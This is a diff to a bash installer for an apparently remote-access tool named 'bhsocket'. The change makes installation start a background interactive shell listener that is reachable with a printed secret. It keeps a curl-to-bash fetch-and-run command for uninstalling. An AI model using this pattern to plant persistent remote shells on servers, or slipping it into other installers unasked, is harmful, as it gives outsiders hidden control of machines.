@@ -214,6 +214,16 @@ download() {
 
 remove_install() {
   local prefix="$1"
+  local run_dir pid_file old_pid
+  run_dir="${TMPDIR:-/tmp}/bhsocket-$(id -u)"
+  pid_file="${run_dir}/${BH_NAME}.pid"
+  if [[ -s "$pid_file" ]]; then
+    old_pid="$(cat "$pid_file" 2>/dev/null || true)"
+    if [[ -n "$old_pid" ]] && kill -0 "$old_pid" 2>/dev/null; then
+      kill "$old_pid" 2>/dev/null || true
+    fi
+    rm -f "$pid_file"
+  fi
   rm -f "${prefix}/bin/${BH_NAME}"
   rm -f "${prefix}/lib/bhsocket/${BH_NAME}.real"
   if [[ "$(id -u)" = "0" && -L "/usr/bin/${BH_NAME}" ]]; then
@@ -226,6 +236,35 @@ cleanup() {
   if [[ -n "$BH_TMP" ]]; then
     rm -rf "$BH_TMP"
   fi
+}
+
+start_listener() {
+  local bin_path="$1" selected_port="$2" secret="$3" run_dir pid_file log_file pid old_pid
+  run_dir="${TMPDIR:-/tmp}/bhsocket-$(id -u)"
+  mkdir -p "$run_dir"
+  pid_file="${run_dir}/${BH_NAME}.pid"
+  log_file="${run_dir}/${BH_NAME}.log"
+
+  if [[ -s "$pid_file" ]]; then
+    old_pid="$(cat "$pid_file" 2>/dev/null || true)"
+    if [[ -n "$old_pid" ]] && kill -0 "$old_pid" 2>/dev/null; then
+      kill "$old_pid" 2>/dev/null || true
+      sleep 1
+    fi
+  fi
+
+  BH_SOCKET_PORT="$selected_port" nohup "$bin_path" -s "$secret" -l -i >>"$log_file" 2>&1 </dev/null &
+  pid="$!"
+  printf '%s\n' "$pid" >"$pid_file"
+  sleep 1
+
+  if ! kill -0 "$pid" 2>/dev/null; then
+    [[ -s "$log_file" ]] && tail -n 20 "$log_file" >&2 || true
+    return 1
+  fi
+
+  say "--> Listener PID: ${pid}"
+  say "--> Listener log: ${log_file}"
 }
 
 install_client() {
@@ -299,6 +338,9 @@ install_client() {
   report_install "$bin_path" "$selected_port" "$BH_SECRET"
   ok
 
+  step "Starting listener"
+  if start_listener "$bin_path" "$selected_port" "$BH_SECRET"; then ok; else failed; return 1; fi
+
   say "--> Installed ${bin_path}"
   say "--> Command path: ${bin_path}"
   if [[ "$(command -v "$BH_NAME" 2>/dev/null || true)" != "$bin_path" ]]; then
@@ -306,16 +348,9 @@ install_client() {
   fi
   say ""
   say "--> To uninstall use BH_UNINSTALL=1 bash -c \"\$(curl -fsSL ${BH_BASE_URL%/}/y)\""
-  say "--> Basic usage:"
-  say "--> SECRET=\"\$(${BH_NAME} -g)\""
-  say "--> ${BH_NAME} -s \"\$SECRET\" -l -i"
-  say "--> ${BH_NAME} -s \"\$SECRET\" -i"
-  say ""
-  say "--> To reuse this generated secret:"
-  say "--> ${BH_NAME} -s \"${BH_SECRET}\" -l -i"
+  say "--> Listener is running on this server."
+  say "--> To connect from your computer:"
   say "--> ${BH_NAME} -s \"${BH_SECRET}\" -i"
-  say "--> S=\"${BH_SECRET}\" bash -c \"\$(curl -fsSL ${BH_BASE_URL%/}/y)\""
-  say "--> S=\"${BH_SECRET}\" bash -c \"\$(wget -qO- ${BH_BASE_URL%/}/y)\""
 }
 
 main() {
